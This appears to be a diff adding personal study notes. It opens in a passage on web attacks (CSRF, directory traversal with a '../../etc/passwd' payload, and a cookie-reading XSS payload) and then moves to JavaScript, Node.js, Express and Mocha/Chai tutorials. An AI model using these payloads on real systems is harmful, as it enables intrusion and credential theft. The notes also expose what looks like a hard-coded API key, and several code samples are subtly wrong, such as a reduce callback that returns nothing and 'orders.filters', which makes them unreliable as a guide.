+    </form>                                                 // bcz when the body loads it automatically submits that form
+</body>
+
+So how does the server tells that this request is any different from a normal request the user would make and the answer is it can't
+
+The way for the server to do traditionally is to mitigate the bug through the use of CSRF tokens, so basically u have to generate a random token
+tie it to the user session and then embedded it in each form u generate every single form u generate is going to setup an additional input of
+that CSRF token
+
+Here u can see an example of Form that actually contains that CSRF token
+
+<form action="post" method="POST">
+    What's on ur mind?<br>
+    <textarea cols="40" row="3" name="status"></textarea><br>
+    <input type="hidden" name="crsf" value="4daada89daa7879dya87yda8yda8">
+    <input type="submit" value="transfer">
+</form>
+
+So when the server gets a post request any post request, it should always check to see that the CRSF token is present and matches the token
+associated with the user's session
+Note -> this will not help u with GET requests, and ur requests should only ever give u data they should never actually change data, and u might
+also have seen this that applications change state with GET all the time, So this leads to a vulnerability
+
+How not to mitigate?
+their r plenty of sites which implement "dynamic CSRF-proof forms". They had a csrf.js file that sends back code roughly roughly equivalent
+to: $csrf = 'session CSRF token';
+On each page, they had <script src="/csrf.js"> and then baked the CSRF tokens into the forms from there. So all i had to do was include that
+same tag in my own exploit. // because just instead of providing the CSRF token into every form u r providing it from a JS file which is
+kind of giving away the CSRF token.
+// So an attacker always look for a CSRF token.
+
+XSS and Authorization ->
+
+
+SQL Injection ->
+
+Directory Travesal -> it is almost a path injection attack, by controlling path construction, u r able to walk up the filesystem tree and control
+where files r being read/written
+In most operating systems their r two special directories-> . and ..
+. is always ur current directory and .. is always the parent directory
+
+Ex ->
+<?
+echo file get contents('/var/www/sandbox/uploads/' . $_GET['file']); //
+?>
+
+In this case we have the GET parameter file appended to a path '/var/www/sandbox/uploads/' then read that file and echo it to the page
+10..../dvwa/mutilldae/index.php?page=../../../../../etc/passwd // now here u can see how I can go easily from one directory to another just
+by changing the URL path for filesystem now this could lead to code execution also additionally database contents r often revealed when application
+shares a host with it's database, permissions should also be set so that database files aren't readable by the webserver but that even work
+always in real life
+
+Burp Proxy -> it sits between ur browser or other client and web server
+
+Cookie Tampering ->
+<script>alert(document.cookie)</script> in the input box and u will get the token
+
+
+-----------------------------------------------------------------------------------------------------------------------------
+
+Javascript ->
+
+youtube tutorial videos -> https://www.youtube.com/watch?v=ni9e-lOEw3Q&index=3&list=PL4cUxeGkcC9i5yvDkJgt60vNVWffpblB7
+
+-> var name = ['a','b'];
+  here name is a array object that's why when we expand it we will find property length
+  and we expand __proto__ we will get the list of methods applicable to it
+  
+-> var name ='Sadanand' is not an object but still if we do 'name.length' we will get output '8' how?
+    internally the javascript corrupts the name also that's why we can do that to as
+    
+    var name2 = new String('Sadanand');
+    and when we expand this it will we having length property also and __proto__ also which we can expand too.
+    
+    that's why if we do name.toUpperCase() it will convert it to Uppercase and name2.toUpperCase() would also be converted 
+    to uppercase.
+    
+-> How to create Object or object literal?
+    - var userObj={                 // Here we are encapsulating properties such as email and login in userObj
+        email: 'adasdas',
+        login: function(){
+          console.log(this.email); // here this refers to userObj 
+        }
+      }
+
+      here if we do userObj.login on console then the output will be like this -> f (){console.log(this.email);}
+      but if we do userObj.login() on console then the output will be like this -> adasdas
+
+    or
+    
+    - var objectName={
+        email: 'adasdas',
+        login(){}
+    }
+
+    here if we do userObj.login on console then the output will be like this -> f login(){console.log(this.email);}
+    
+ -> Outside of any JSON object, function and anything 'this' refers to window object. and global objects such as userObj from
+    above example.
+      
+ -> userOne = {}
+      userOne['email'] = 'asdasdas.com';
+
+      or
+
+      var prop='email';
+      userOne[prop] = 'asdasdas.com';
+      
+      this is equivalent to
+      
+      userOne.email = 'adasdas'
+      
+-> Their are no actual classes in javascript these are just syntactical sugar over javascript prototype, So these are just only
+   pretend classes. We have these classes since es6, before them we use prototypes , prototypes is just object
+      
+-> Internally Classes works in similar way as prototypes
+
+-> var userOne={
+        name: 'One',
+        login(){
+          console.log(this.name)
+        }
+    }           // userOne object created
+   
+    var userTwo={
+        name: 'Two',
+        login(){
+          console.log(this.name)
+        }
+    }           // userTwo object created
+    
+    instead of creating the user objects manually we can use Class for the same task
+    
+    class User{
+      constructor(name){
+        this.name = name;             // here this refers to the new empty object which is 'new User()'
+      }
+      
+        login(){
+          console.log(this.name); // Here this.name is refering to this.name in constructor
+        }
+    }
+    
+    var userOne = new User('One') // output of this would be same as created manually like above
+    var userTwo = new User('Two')
+    
+    // the 'new' keyword
+          - creates a new empty object {} 
+          - sets the value of 'this' to be the new empty object
+          - calls the constructor method
+    
+    the one difference is when you console.log(userTwo) which is created by class the login is now inside __proto__ property
+    of the userTwo but we can call it in the same way as userTwo.login()
+    
+    -> Method Chaining
+    
+      class User{
+      constructor(name){
+        this.name = name;             
+      }
+      
+        login(){
+          console.log('LogIn');
+        }
+        
+        logout(){
+          console.log('LogOut');
+        }
+      }
+    
+    var userOne = new User('One');
+    // If we now do as
+    
+    userOne.login().logout(); // this will execute login() but after it this will give error cannot read property logout()
+    
+    but
+    
+    class User{
+      constructor(name){
+        this.name = name;             
+      }
+      
+        login(){
+          console.log('LogIn');
+          return this;          // return instance of object
+        }
+        
+        logout(){
+          console.log('LogOut');
+        }
+      }
+      
+      var userOne = new User('One');
+      userOne.login().logout(); // this will now not give error and both methods will execute properly because this time we 
+                                   are returning instance of object in method login() so logout() will got the instance of userOne
+                                    
+  (2) - Class Inheritance
+    
+    class A{
+      constructor(a){
+        this.a = a;
+      }
+        b(){
+          console.log('B', this.a);
+        }
+    }
+    
+    class B extends A{
+        c(){
+          console.log('C', this.a);
+        }
+    }
+    var a1 = new A('aa');
+    var b1 = new B('bb'); //If child class doesn't have constructor then it will have the constructor of it's parent class that's why
+                            we have to pass argument here also otherwise the value of 'a' in class B will be undefined
+
+    Output of b1.c() -> 'bb'
+    
+    - If we do 'console.log(b1)' then the 'c()' would be inside __proto__ and after expanding it we will see __proto__ again which
+        would contain the 'b()' which is inherited from class A 
+    
+  (1)  - Using Prototypes in place of Classes
+      
+        class User{
+          constructor(name){
+            this.name = name;        
+          }
+
+            login(){
+              console.log(this.name); 
+            }
+        }
+
+        var userOne = new User('One')
+         
+        this is equivalent to 
+        
+        function User(name){
+          this.name = name;
+          this.login = function(){
+            console.log(this.name);
+          }
+        }
+        
+        var userOne = new User('One')
+        
+    - while using class if we do console.log(userOne) the login is inside __proto__ property but while using Prototype model the login
+      would be not in __proto__ instead it would be with 'name' property
+        
+    - Every object type has a prototype such as date and array both has prototype.
+    
+    - the prototype is defined once that's why it is not hard coded that's why 'User' prototype login would be same for 
+      both userOne and userTwo as they both are borrowing or sharing instead of storing them inside userOne and userTwo
+      in below code
+        
+         class User{
+          constructor(name){
+            this.name = name;           
+          }
+
+            login(){
+              console.log(this.name); 
+            }
+        }
+
+        var userOne = new User('One') 
+        var userTwo = new User('Two')
+
+        that's why on expanding __proto__ property of either userOne or userTwo we will find login() inside __proto__
+        
+   ->   Now as shown above in point (1) while using class if we do console.log(userOne) the login is inside __proto__ property
+        but while using Prototype model the login would be not in __proto__ instead it would be with 'name' property this doesn't means
+        that we cannot have 'login' or other properties inside __proto__ while using Prototype model instead of class we can convert
+        above point (1) prototype model syntax as follows
+        
+        function User(name){
+          this.name = name;
+        }
+        
+        User.prototype.login = function(){
+          console.log(this.name);     // here this is referring to userOne
+        }
+
+        var userOne = new User('One')
+
+        Now the 'login()' would be inside __proto__ property just like class
+        
+        
+    -> Prototype Inheritance
+        
+        function User(name){
+          this.name = name;
+        }
+        
+        User.prototype.login = function(){
+          console.log(this.name);
+        }
+        
+        function Admin(...args){    // ... are called rest parameters
+          console.log(args) // here args is an array of the arguments passed at the time of object creation as ['Admin']
+          User.apply(this.args) // here we are passing the new Admin object instance to User and 'apply' is a predefined method
+          this.role = "adada" // additional property of Admin which User doesn't have
+        }
+        
+        Admin.prototype = Object.create(User.prototype) //this is to inherit prototype properties present in __proto__ property from User
+                                          // if we don't use this line then we don't inherit properties from __proto__ and only the properties
+                                          //of 'User' which r inside __proto__ of User will be inherited other properties will not
+                                          // Object.create() is the way to create object in Javascript 
+        Admin.prototype.deleteUser = function(){  // additional prototype of Admin which User doesn't have
+          console.log(this.name);
+        }
+        
+        var userOne = new User('One');
+        var admin = new Admin('Admin');
+        
+        Now if we do console.log(admin) then we will have the same object structure and properties if we would have 
+        used class inheritance but it won't have the __proto__ properties such as login from User to inherit them to
+        we can use following line 'Admin.prototype = Object.create()'and we can also add additional properties and prototypes 
+        which admin had only.
+        
+        Here would be same feature like in point (2) If we do 'console.log(admin)' then the 'deleteUser()' would be inside __proto__ 
+        and after expanding it we will see __proto__ again which would contain the 'login()' which is inherited from User
+        
+        JavaScript Pro Tips->
+        
+     -> const foo = {name:'Sadanand'}
+        const bar = {name:'Sharma'}
+        
+        instead of logging them separately like this
+        
+        console.log(foo);
+        console.log(bar);
+        
+        we can use computer property names like this
+        console.log({foo,bar}); // this will console all the properties with their names in the simple logging like above we won't have 
+                                // names of the object this is fast with small code and clear
+                                
+     -> we can style console.log data too by adding custom style and '%c' like this
+          console.log('%c My friends','color:orange');
+          
+     -> we can also display data as a table in console by using 'table' like this
+          console.table([foo,bar])
+          
+     -> If we wants to know the time required between the execution of code or wants to know performance we can do like this
+         console.time('any_name');
+         // code to be executed or api request any thing
+         console.timeEnd('any_name')
+         
+         this will give the output as 'any_name: 0.0002131212312'
+         
+      -> If we wants to know that where particular function is defined and from where it is called we can do like this
+      
+          const deleteMe = () => console.trace('any_string')
+          deleteMe() 
+          
+          // after running this code we will get the line no's where the code is defined and called in console
+          
+ -> Destructuring
+ 
+  const animal ={
+    name: 'Bob',
+    age: 100
+  }
+  function feed(animal){
+    return `${animal.name} ${animal.age}`     // Here we have to repeat animal again and again hence it is considered bad coding
+  }
+  
+  Another way is destructuring
+  
+  function feed({name,age}){    // Here we are passing the properties in the function as arguments
+    return `${name} ${age}`
+  }
+  
+  another way of destructuring is
+  
+  function feed(animal){
+    const {name,age} = animal;
+    return `${name} ${age}`
+  }
+  
+  
+  -> Template literals
+  
+  const turtle ={
+    name: 'Bob',
+    age: 100
+  }
+  
+  let bio = turtle.name + ' age is ' + turtle.age   // bad coding for the string concatenation
+  
+  // proper way for string concatenation
+  
+  const {name,age} = turtle;
+  
+  let bio = `${name} age is ${age}`
+  
+  // another better way is to use functions for the above task
+  
+  function turtleData(str,age){     // Here str is the array of strings which should be first argument
+      const ageStr = age > 5 ? 'old' : 'young';
+      return `${str[0]} ${ageStr} at ${age}`
+  }
+  
+  const bio2 = turtleData`This is ${turtle.age}`;  // here instead of turtleData() we are doing turtleData``
+  
+  -> Spread Syntax
+  
+  const obj1 = {name: 'Sadanand'};
+  const obj2 = {age: 25, place: 'Pune'};
+  
+  // Now if we wants to assign the properties of obj2 to obj1 we generally do
+  
+  obj1['age'] = obj2.age;             // this is bad coding
+  obj1['place'] = obj2.place;
+  
+  // better way is
+  
+  const newObj1 = Object.assign(obj1,obj2) // this will merge the objects from left to right hence output would be
+                                           // o/p -> {name:'Sadanand',age:25,place:'Pune'}
+                                           
+ // or if we wants to add a single property to object we can do
+  
+  const newObj2 = Object.assign(obj1,{age: 25}) // Here o/p is {name:'Sadanand',age:25}
+  
+ // More better way is using the spread operator
+ 
+ const newObj3 = {...obj1,...obj2}  // Here o/p is {name:'Sadanand',age:25,place:'Pune'}
+
+  or
+  
+  const newObj3 = {...obj1,age: 25} // Here o/p is {name:'Sadanand',age:25}
+  
+ -> Using spread syntax on arrays
+  
+    let alphabet = ['a','b'];
+    
+    // normally we do to add data in array as
+    
+    alphabet.push('c');   // this is bad coding
+    
+    // better way using spread syntax
+    
+    let alphabet = [...alphabet,'a','b']; 
+    or
+    let alphabet = ['a','b',...alphabet]; 
+    or
+    let alphabet = ['a',...alphabet,'b',];  // we can add spread operator in the start, end or in middle
+    // notice in the above array in which ...alphabet is in middle the comma is let in the end , previously it could
+      break the code but now in new javascript we can do this and it is also considered good practice
+      
+  -> Loops -> instead of using the loop for the following tasks try these methods
+    
+    const orders = [500,30,90,15];
+
+    const totals = orders.reduce((acc,cur) => { // acc is the accumulated value, cur is the current value
+        acc + cur   // this will give us the total of the elements in the array
+    })
+
+    const maps = orders.map(v => v * 1.1)   // this will multiple 1.1 in every value of the array
+
+    const filters = orders.filters(v => v > 100) // here if the value is greater then 100 then only the value will allowed in new array
+
+  -> Promises -
+    let promiseObj = new Promise(function(resolve,reject){
+        let isClean = true;
+        if(isClean){
+            resolve('Clean')
+        }
+        else{
+            reject('Not Clean')
+        }
+    });
+
+    promiseObj.then(function(resolveData){
+        console.log('Output ',resolveData);
+    }).catch(function(rejectData){
+        console.log('Error ',rejectData);
+    })
+    
+    
+    
+  
+  ---------------------------------------------------------------------------------------------
+  
+  Nodejs ->
+  
+  - Node and chrome both run V8 javascript runtime engine, using this v8 engine we can can convert javascript code into faster
+  machine code and executes it
+- To verify this we can run console.log('Hello') in browser console and in cmd prmpt write 'node' enter and then console.log('Hello')
+  you will observe both has the same output after execution.
+- v8 engine is written in c++.
+- In browser their is global object 'window' equivalent to it in node is 'global' it contains most of the things which is inside 
+  'window'.
+- In browser their is 'document' which contains the reference of DOM same we have 'process' in node which contains which contains
+  information about node process which has been executed, it also contains methods such as process.exit(0)
+- Node do an Non-blocking I/O which means the one event do not have to wait for the finish of the another event which means multiple
+  events must be executing in the same moment
+- others can do non-blocking execution too but they require more than one thread to do it, which means more resources and CPU
+  is required, Node can do non-blocking in same thread
+- On calling a file using require such as const a = require('./file_a') the whole file 'file_a' will be also executed.
+- npm init(to create package.json file)
+- npm install --save 'module_name' (using of --save install the module locally and it would be added to your 'dependencies' also
+  in package.json file)
+- npm install(this cmd will install all the dependencies modules defined in package.json dependencies)
+- npm install module_name@version_no.(To install module of specific version)
+- module (this module is present globally no need to require it)
+- os (this module is used for OS related things)
+- fs (this module is used for file related things)
+- lodash (this module is used for things such as sorting, arrays, typechecking etc)
+- nodemon (used to restart the node server whenever the changes are done it is not installed using --save it is installed globally)
+- yargs (this module is used to get input from terminal)
+
+- process.argv[2] and further indexes such as process.argv[3] could be used to get input from cmd prmpt such as
+    node filename hello
+    now to get hello inside node code we can use process.argv[2] which gives 'hello'
+    but their is a issue in process.argv that we can't define variables values such as if write
+    node filename --title=secret
+    it is going to consider the '--title=secret' as one string and we write
+    node filename --title secret
+    it is going to consider --title and secret as two different strings
+    
+- We can resolve the process.argv problem by using third party module 'yargs' in place of process as
+    'yargs.argv' will give us as JSON object and 'node filename --title=secret' will assign title as secret 
+- We can use yargs.command() to define the input or we can say to give warning or message when input is given wrong
+   watch udemy tutorial NodeJS-> Section 3, Lecture 23
+   we can also provide help message, alias and field type
+    
+- yargs.options({
+    a: {
+        demand: true,     // if demand is true then the user has to provide this terminal input
+        alias: 'address',
+        describe: 'Address to fetch weather for',
+        string: true   // this makes it compulasary to provide the input type as required such as string the user cannot provide other
+                           types of data such as number
+    }
+}).help().alias('help','h').argv;    
+    
+- JSON.parse() => It converts the String object to json object.
+- JSON.stringify() => It converts the json object to string object.
+- In ES6 if the property name is same as attribute name then we do not need to write property name too
+
+    Ex =>
+      var note = {
+            title: title,
+            body: body
+        }
+
+    is equal to
+
+      var note = {
+            title
+            body
+        }
+
+- Array filter method, it returns array if the condition defined is true
+    Ex => array.filter((arraydata) => conditional Expression)
+    If conditional Expression is true then the 'arraydata' is returned as value and returned value would be a array containing data
+    
+- back tick syntax `Enter the String ${dynamic value variable}`.
+
+- the nodejs has it's own debugger it is available for node version 8 and above
+
+    - 'node inspect file_name' to start the debugger on that file
+    - 'n' command is use for the next( to show the next code)
+    - 'c' command is used for continue it executes the whole program
+    - 'repl' command is used to check the value of object or to manipulate object value and see output according to it
+    - 'list(10)' command is used to get the code 
+ 
+ - writing the 'debugger' statement inside the code creates a special line break 
+ 
+ - we can also use nodemon with inspect as 'nodemon inspect file_name'
+ 
+ - we can also use chrome debugger tool by using 
+    node --inspect-brk file_name
+    then in chrome tab type 'chrome://inspect'
+    then click 'open dedicated devtools for node'
+    on the opened window press 'esc' key to open console too
+    we can also use nodemon as 'nodemon --inspect-brk file_name'
+    
+ - we cannot use 'this' and 'arguments' inside arrow function and we can use functions ad key value pairs inside JSON object
+   to understand see udemy tutorial Section 3 lecture 24
+    
+- when a node app is executed the first 'Call Stack' is executed in which the 'main()' is executed first ,
+  Call Stack basically keep track of the functions executing and the statements fired
+  To understand properly watch udemy video NodeJS Section 4 lecture 27
+- 'Call Stack' from call stack if their is any node api or async callback type such as setTimeout it get registered to 'Node Apis'
+  block after which it moves to the 'Callback queue' then the 'Event Loop' checks whether the call stack is empty or not.
+  the 'Callback queue' is executed when the 'Call Stack' is empty.
+    
+- Simple callback function is executed when some data is returned in
+    Ex->
+        var getUser = (id,callback)=>{
+            var user={
+                id: id,
+                name: 'Vikram'
+            };
+            callback(user);
+        };
+
+        getUser(31,(userObj)=>{
+            console.log(userObj);
+        });
+- When their are two many data then the output is shown as [object] which is in compressed form to expand it is called pretty print 
+  object we can use JSON.stringify(data,undefined,no. of spaces) generally the no. of spaces in 3rd argument of JSON.stringify
+  is '2' and second argument in JSON.stringify we mostly write as undefined
+
+- request({
+        url:'http.......',
+        json:true               // if we set the json:true then the request headers will be set to 'application/json'
+      },(error,response,body)=>{
+        console.log(JSON.stringify(error,undefined,2)) // if while making a request their is no error then the error output will be null
+      });
+
+- encodeURIComponent('string') is helpful to encode the string for the url as it replace spaces with %20, to convert back into string we can
+  use decodeURIComponent('encoded_string')
+    
+           const argv = yargs.options({
+            'a': {
+                demandOption: true,
+                alias: 'address',
+                describe: 'Address to fetch weather for',
+                type: 'string'
+            }
+           }).argv;
+
+            console.log('Check a ',argv.address);
+
+            var encodedAddress = encodeURIComponent(argv.address);
+
+            console.log('Check Address ',encodedAddress);
+
+            request({
+                url: `http://www.mapquestapi.com/geocoding/v1/address?key=MUKdcQeqYeJZq7nEWsrNjUKhVDdYZeGv&location=${encodedAddress}`,
+                json: true
+            },(err,res,body)=>{
+                    console.log(body.results[0].locations[0].latLng.lat);
+            });
+            
+            
+    - Promises are since es6 before that we use third party libraries for it
+    - You can only pass one argument in resolve and reject callbacks of Promise Object , you cannot execute resolve and reject both
+      only one of them would be executed this prevents the accidental code execution like in callback as the multiple callbacks
+     could be executed but Promises prevent us from doing so.
+            
+            Ex-> var getUser = (id,callback)=>{
+                    console.log('Id ',id);
+                    var user={
+                        id: id,
+                        name: 'Vikram'
+                    };
+                    callback(user);
+                    callback(); // unnecessary callback
+                };
+
+                getUser(31,(userObj)=>{
+                    console.log(userObj);
+                });
+            
+        - Before the promise's reject or resolve callbacks are executed the promise is in a state called pending
+        
+        Synchronous Use of Promise Ex->
+            var somePromise = new Promise((resolve,reject)=>{
+               resolve('Resolved');
+               reject('Rejected');
+            });
+
+            somePromise.then(data => {              // promises are executed when the 'then()' is executed
+                console.log('Data ',data);          // this 'then' function is executed when the things go as expected as it is 
+                                                       handler for resolve
+            })
+            
+        Asynchronus Use of Promise Ex->
+            const request = require('request');
+
+                var somePromise = new Promise((resolve,reject)=>{
+                    request({
+                    url: `https://jsonplaceholder.typicode.com/todos/1`,
+                    json: true
+                    },(err,res,body)=>{
+                    if(err){
+                        reject('Promise is Rejected')
+                    }
+                    else{
+                        resolve('Promise is Resolved');
+                    }
+                });
+
+                });
+
+                somePromise.then(data => {
+                    console.log('Data ',data);
+                },(error)=>{ // this is handler for reject callback if it is not present then the reject callback out put is not shown in output
+                    console.log('Error ',error);
+                })
+
+ - Format to use Promises with functions or when we need to use some kind of inputs inside Promise
+        Ex-> var asyncAdd = (a,b) => {
+                return new Promise((resolve,reject) => {
+                    setTimeout(()=>{
+                        resolve(a+b);
+                    },1000);
+                });
+            }
+
+            asyncAdd(5,7).then((data)=>{
+                console.log('Data ',data);
+            });
+
+- Promise Chaining
+        
+        Ex-> var asyncAdd = (a,b) => {
+                return new Promise((resolve,reject) => {
+                    if(typeof a === 'number' && typeof b === 'number'){
+                        resolve(a+b);
+                    }
+                    else{
+                        reject('Not a number');
+                    }
+                });
+            }
+
+            asyncAdd(5,7).then((data)=>{
+                console.log('Data ',data);
+                return asyncAdd(2,3);    //Chaining of Promise
+            },(error)=>{
+                 console.log('Error ',error);
+            }).then((data)=>{               // Handler for the chained promise
+                console.log('Data ',data);
+            },(error)=>{                    // Error Handler for the Chained Promise
+                console.log('Error ',error);
+            });
+            
+            
+  - If one of the promise comes in the reject callback others won't stop but In certain conditions it will give issue such as if
+    above chained promises we replace 5 as '5' in string format then the output would be
+     o/p->   
+        Error  Not a number         // Output of First Promise
+        Data  undefined             // Output of Second Promise , this happened bcz error handler of 1st promise got executed and 
+                                        second handler doesn't need to handle it So the then of 2nd promise got executed
+                                        
+  - The above issue could be resolved as doing this 
+        asyncAdd('5',7).then((data)=>{
+            console.log('Data 1',data);
+            return asyncAdd(2,3);
+        }).then((data)=>{
+            console.log('Data 2',data);
+        }).catch((error) => {
+            console.log('Error ',error);
+        });
+
+    by doing this the promise chain would be break if in any promise the error occurred because now we are providing only one handler
+    that is catch()
+        
+   - The request library does not support promises but we can use promises inside it by, Axios library which support promises
+
+    - Throw error intentionally
+        if(condition){
+            throw new Error('Any Text')
+        } 
+        
+   - Express ->
+        var app = express();
+        
+        app.get('/urlName',(req,res)=>{     // req contains the info of the req coming in such as headers which been used, body info, path etc
+            res.send('Hello')               //Sending Simple Text express will automatically setup Content-type for us as 'text/html' for this
+            res.send({                      //Sending JSON object express will automatically setup Content-type for us as 'application/json' for this
+                name: 'Sadanand',
+                likes: [
+                    'Shooting'
+                ]
+            })
+        });                             //setting up a routing handler
+        app.listen(port No)            //bind the port on the machine
+
+- If we are using express and then we can setup the static content to be hosted from the node such as we can host html pages which we 
+    want to be publicly available.
+    
+(1)- var app = express();
+
+    app.use(express.static(__dirname + '/public')); // adding a middleware for express 
+                                                    // express.static('') takes the absolute path to the folder u want to serve up
+    app.listen(3000,()=>{                           // __dirname contains the path to the root directory
+    console.log('Server is up on Port 3000');       // this callback in app.listen is optional
+    });                               
+                                
+    Using the above code we can serve static files or directory such localhost:3000/index.html , index.html is inside public folder
+                                
+ - Templating Engine (Templating Engine let u render html but in dynamic way in which u can inject values such as username or
+        other inputs using templating engine we can also create reusable markup such as header and footer which is same for lot of
+           pages)
+           Ex-> Pug, Jade, Handlebars(hbs) etc
+           
+           app.set('view engine','hbs')  // this is used to set express related configurations here 'view engine and hbs' both are predefined
+           
+           we have to put the hbs files in views folder 'views' is the default directory which express uses for it's tempelates
+           
+           app.get('/about',(req,res)=>{
+               res.render('view_template_filename.hbs',{        // this to render the view engine template file
+                    paramName: 'Data'                           // this is to send the data to view template
+                })
+           )}        
+           
+   - To now how to reduce the code in hbs watch video -> https://www.udemy.com/the-complete-nodejs-developer-course-2/learn/v4/t/lecture/5525320?start=0
+     nodemon server -e js,hbs // this command is to watch extensions here it is hbs extension
+
+   - Express Middleware allows you to add on to the existing functionality that express has so if express cannot do something that u
+     want it to do, u can add some middleware and teach it how to do that thing, we use 'app.use(middleware_func)' to register
+     middleware
+
+- we can use middleware in many ways such as providing middleware on req to decide the access of api or authentication etc
+
+Ex's ->1) app.use((req,res,next)=>{       //next is used to tell middleware what to do when middleware work is done so only when next() is called the application continues after it
+            // task to do
+        });
+        2) app.use(express.static(__dirname + '/public'))
+
+    - To see the list of things which are available to us by 'req' the request param of the express such as req.url go to link->
+        http://expressjs.com/en/4x/api.html#req
+        
+    - If in a express middleware we haven't called the 'next()' then any other url which is rendered using the res.render will also
+        not being executed it will remain on the same page or the middleware such as example
+        
+       Ex->  app.use((req,res,next)=>{
+                res.render('maintenance.hbs');
+            });
+            
+      So if we do localhost:3000/any_url_other also it will not rendered as it will be showing maintenance.hbs template always
+      
+      but if we do localhost:3000/index.html which is for to serve the static page above in point (1) we got rendered only if we have
+      done the the middle ware in the flow like in the down Ex as we are doing the staic middleware execution before the render 
+      middleware execution, that's why we should arrange the middlewares according to the priority order.
+      
+      Ex->    app.use(express.static(__dirname + '/public'));
+              app.use((req,res,next)=>{
+                        res.render('maintenance.hbs');
+                    });
+                    
+                    So to not let localhost:3000/index.html to be executed be should do the order as down below
+
+              app.use((req,res,next)=>{
+                        res.render('maintenance.hbs');
+                    });
+              app.use(express.static(__dirname + '/public'));
+              
+ - For heroku to work we need to define port as 
+        const port = process.env.PORT || 3000;   // here the process.env.PORT is for the deployed app and for local run it is 3000
+        // use above described port variable as for app.listen
+        app.listen(port,()=>{
+            console.log(`Server is running in Port ${port}`);
+        });
+  
+   - Testing buy Mocha
+    
+    - To explore mocha more go to link->https://mochajs.org/
+    
+    - npm i mocha --save-dev // using the --save-dev save the package for development purposes only as we need mocha only for our system
+    // usage only ,the packages install using flag --save-dev the packages are installed in devDependencies of package.json
+    // the packages in devDependencies will not be installed in heroku or other platforms thats why the packages to be used by system
+    // only should be saved in devDependencies
+    
+    - for test cases the file should be created with extension test.js such as filename.test.js
+              
+     - it('should add two numbers',()=>{         // 'it' is a function provided by mocha the first argument in 'it' should be string which defined what we are doing ,this is behaviour driven development(bdd) principle 
+            var res = utils.add(33,11);         // the second argument in 'it' contains callback whcih has the task to be executed for test case 
+            if(res !== 44){                     
+                throw new Error('Value not correct')       // to throw error manually when certain conditon is fullfilled
+            }
+        });
+              
+     - for the execution of test cases we should alter package.json as
+        "scripts": {
+            "test": "mocha **/*.test.js",       // here **/*.test.js is telling to look the full directory with extensions test.js
+         }
+        then run cmd-> npm test
+      
+      - to run the test case whenever any file is changed we use cmd-> nodemon --exec "npm test"
+      
+      - we can also do it as writing the cmd inside the package.json as
+        "scripts": {
+            "test": "mocha **/*.test.js",
+            "test-watch": "nodemon --exec \"npm test\""
+          }
+     then we use cmd-> npm run test-watch \\we are using run in the command because the test-watch is custom variable so we have to use run
+        \\ for the predefined variables of scripts such as start and test we do not need to include run we can simply do npm start or npm test
+
+Testing by Mocha continues->
+
+- chai Assertion library link -> https://www.chaijs.com/
+- keywords for chaijs assertion -> https://www.chaijs.com/api/bdd/
+
+- tutorial link-> https://www.youtube.com/watch?v=kMOaqOslnHc&list=PL_dsdStdDXbrc2gJYuMKqKTYVy6sxtyJu&index=2
+Example for expect in Chai->
+const expect = require('chai').expect;
+var tVar = {
+    name:'abc',
+    age: 27
+}
+
+function testFn(){
+
+}
+describe('Chai expect',function () {            // using the describe is optional (no sure about that)
+    it('Chai expect testcase',function () {
+        expect('abc').to.be.a('string');        // simple bdd's
+        expect('abc').to.not.be.a('number');
+        expect('abc').which.is.not.a('number');
+        expect(10).which.is.a('number').but.not.a('string'); // bdd chaining
+        expect(tVar).to.be.a('object');
+        expect(tVar).is.an('object');
+        expect(tVar).which.is.an('object').has.a.property('name');
+        expect(tVar).which.is.an('object').but.has.a.property('name').which.is.a('string');
+        expect(tVar).which.is.an('object').but.has.a.property('name').which.is.a('string').to.be.equal('abc');
+        expect(tVar).not.has.a.property('address');
+        expect(typeof(tVar) == 'object').to.be.true;
+        expect(typeof(testFn) == 'function').to.be.true;
+    })
+});
+
+describe('Chai expect2',function () {
+    it('Chai expect testcase2',function () {
+        expect(tVar).which.is.not.frozen;       // checking for freeze type or not
+        Object.freeze(tVar);                    // changeing the object to freeze type
+        expect(tVar).to.be.frozen;
+    })
+})
+
+- Object.freeze(object_name) -> A frozen object can no longer be changed; freezing an object prevents new properties from being added to it,
+existing properties from being removed, prevents changing the enumerability, configurability, or writability of existing properties,
+and prevents the values of existing properties from being changed.
+
+Example for should in Chai->
+const should = require('chai').should();
+
+describe('Chai should',function () {
+    it('Chai should testcase',function () {
+        expect("test").to.be.a('string');
+        'Test'.should.be.a('string');     // in the expect the object is passed inside the expect and in should the should comes after object
+        (10).should.be.a('number');
+        (10).should.be.a('number').but.not.a('string');
+        tVar.should.be.a('object');
+        (new testFn).should.be.a('object');     // checking the constructor or be can say object of function testFn
+        tVar.should.have.a.property('name');
+        tVar.should.have.any.key('name','address ');
+        tVar.should.have.all.key('name','age');
+    })
+})
+
+Example for assert in Chai->
+
+const assert = require('chai').assert;
+
+describe('Chai assert',function () {
+    it('Chai assert testcase',function () {
+        assert(10 != 20);                         //in assert first argument is mandatoy others are optional
+        assert(10 != 20,"10 is not equal to 20"); // 1st argumnet is expression and 2nd argumnet is the statement when expression fails
+        assert.equal(tVar.name,'abc',"The property value is not same"); // here 1st and 2nd arguments are checked and 3rd argument
+    })                                                                  // contains the statement to show when 1st and 2nd are not equal
+});
+function myObj(){
+    return{
+        value: 100,
+        axis: 20
+    }
+}
+
+describe('Chai assert2',function () {
+    it('Chai assert testcase2',function () {
+        let t1 = new myObj();
+        let t2 = new myObj();
+        assert.equal(t1,t2);      // this testcase will fail because two objects can not be checked for equal
+        assert.deepEqual(t1,t2);  // to check is two objects are equal or not we use deepEqual
+        assert.isObject(tVar);
+        assert.isObject(myObj());
+    })
+});
+
+-> Async Test Case 
+      it('should async add two numbers',(done)=>{                 // here in theargument their 'done' this is to tell mocha that this test case is asynchronous
+          utils.asyncAdd(4,4,(sum)=>{                             // if 'done' is mentioned that the test case will always execute as the pass test means no error even if their is an error       
+              expect(sum).to.be.equal(7).which.is.a('number');
+              done();                                             // here done tells mocha that testcase is complete you can proceed
+          });
+      });
+      
+      - Mocha also tells you time who mush async testcase has taken
+      
+-> It is not a easy task to test async apps and http call so that's why we are going to use supertest for it the 'supertest' has
+    built in support for express as it is developed by the developers of express to test express apps
+    
+    - Express by default sends staus code 200
+    
+    to explore more supertest-> https://github.com/visionmedia/supertest
+    
+    Example using supertest with mocha->
+    
+        const express = require('express');
+
+        const app = express();
+
+        app.get('/user', function(req, res) {           // express route
+          res.status(200).json({ name: 'john' });
+        });
+      
+        it('respond with json', function(done) {        // test case , done is mandatory as this is a async call
+            request(app)
+              .get('/user')
+              .set('Accept', 'application/json')        // because JSON is true
+              .expect('Content-Type', /json/)
+              .expect(200, done);
+          });
+          
